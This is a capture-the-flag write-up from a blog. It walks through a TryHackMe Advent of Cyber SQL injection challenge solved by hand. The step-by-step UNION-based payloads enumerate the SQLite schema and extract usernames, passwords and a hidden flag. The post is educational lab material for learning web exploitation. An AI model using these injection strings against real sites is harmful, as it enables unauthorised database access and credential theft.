---
layout: post
title:  "Advent of Cyber 2 - Day 5 (Manual Mode)"
date:   2020-12-06 00:12:21 -0400
category: [writeups]
challenge-source: [TryHackMe]
challenge-category: ['Web Exploitation']
tags: [TryHackMe]
author: shinris3n
---

<a href = "https://tryhackme.com/" target="_blank"><img src="/assets/writeups/TryHackMe/THMlogo.png" width="225"></a>

<h2>Someone stole Santa's gift list!</h2>
Sqlmap was a nice and straightforward way of solving this challenge, but I was curious how it could be solved manually.  I saw that others were also interested in the AoC2 Discord channel, so I decided to take a crack at it and share a possible solution.

- Just to take a look at what we have access to upfront, we can get all search button related output by trying a wildcard:

![37de0ab710e9d480cc41b2ed5193a753.png](/assets/writeups/TryHackMe/AoC2D5/d01b15ca70e045c397034252c2769587.png)

- As for an injection vector, one of the provided resources for this challenge includes a [list of generic payloads](https://github.com/payloadbox/sql-injection-payload-list){:target="_blank"} that we can try out. Here's one string that yields an error message:

![fba82e82ee07183820e349147aa9c123.png](/assets/writeups/TryHackMe/AoC2D5/06fa999848894cbd964eeb2da8ec5041.png)

- It looks like this will work, we just need to make a small adjustment because we have 2 output columns:

`Badboi' UNION SELECT 1, 2--`

![031ad161871e6b41493e28d231633b90.png](/assets/writeups/TryHackMe/AoC2D5/29f06dd5da49482e9f67fd8114809547.png)

- Now we need to leverage this vulnerability to find out what tables are in the database.  We had a hint in the challenge text:

`Santa's TODO: Look at alternative database systems that are better than sqlite.` 

- Based on this, we can assume SQLite is the database that is running.  The search for some payloads that we can adapt is made easier thanks to [another resource shared in the challenge description](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md){:target="_blank"}. Re-working the syntax of the *"Integer/String based - Extract table name"* payload just a bit:

`Badboi' UNION SELECT 1, tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'--`

![3a432b4959a9aac3e635618b51163f41.png](/assets/writeups/TryHackMe/AoC2D5/dd2ff72ac7644a869b52e2842fd71317.png)

- And then doing the same with a payload for column discovery:

`BadBoi' UNION SELECT 1, sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='users'--`

![1c5324b827db2a2ea0f7ed1018c3526f.png](/assets/writeups/TryHackMe/AoC2D5/46fd0eb327d442d6a303186db5e233ab.png)

- After doing this for each table, we can output the contents of the details we want to see:

`BadBoi' UNION SELECT 1, username FROM users--`

![0bdc0e71277868101f7c77e063bf562e.png](/assets/writeups/TryHackMe/AoC2D5/080978b7226f40b6964ca21d86c4260d.png)

`BadBoi' UNION SELECT 1, password FROM users--`

![2a4d9996142daa35fd8ac35f9258056c.png](/assets/writeups/TryHackMe/AoC2D5/ba3b17ac13b546db8a400c979b7bd644.png)

- In a more targeted fashion that might have been useful in other situations:  

`BadBoi' UNION ALL SELECT NULL, password FROM users WHERE username LIKE 'Admin' --`

![d9f814e92318bf197fa8e1369ee879d1.png](/assets/writeups/TryHackMe/AoC2D5/49a29d9f490f42e6bdad559338426d66.png)

- or

`BadBoi' UNION SELECT 1, kid FROM sequels WHERE title LIKE '%Try%' --`

![2538f2ad6752664f59a38c8bf769565b.png](/assets/writeups/TryHackMe/AoC2D5/6319907a5e6346239668f91a4c1c26e3.png)

- and in the case of the challenge we also specifically want:

`BadBoi' UNION SELECT 1, flag FROM hidden_table --`

![a7b2d6fdbc6a1a55e416899387936018.png](/assets/writeups/TryHackMe/AoC2D5/b9d2ecbcf5b643a3ac05bfc94c3a85dc.png)

It was worth taking the extra time to solve the challenge this way, and I definitely appreciate sqlmap for all it automates and how it formats things a lot more now.